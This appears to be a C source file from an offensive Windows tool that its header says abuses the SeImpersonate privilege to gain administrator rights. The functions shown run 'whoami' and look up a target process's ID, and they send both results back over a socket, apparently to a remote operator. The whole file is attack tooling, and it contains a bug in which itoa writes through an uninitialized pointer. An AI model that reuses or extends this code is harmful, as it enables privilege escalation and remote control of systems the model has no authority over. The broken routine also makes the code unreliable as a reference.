/*
* Author: Aleksa Zatezalo
* Date: September 2023
* Description: Uses the SEImpersonate Priveledge to act as an administrator. 
*/

#include "spoofer.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

int username(int sockfd){

    /*print Impersonator*/
    char *print_this = "\r\n\r\n[+] The Current User Is: ";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    char *whoami = "whoami\r\n";
    char *name = doexec(whoami, 0);
    send(sockfd, name, sizeof(char) * strlen(name), 0);
    free(name);
    return 0;
}

// find process ID by process name
int findMyProc(const char *procname, int sockfd) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);

  char *print_this = "\r\n\r\n[+] The Process ID Is: ";
  send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
  
  char *spid;
  // Convert 123 to string [buf]
  itoa(pid, spid, 10);
  send(sockfd, spid, sizeof(int), 0);  
  return pid;
}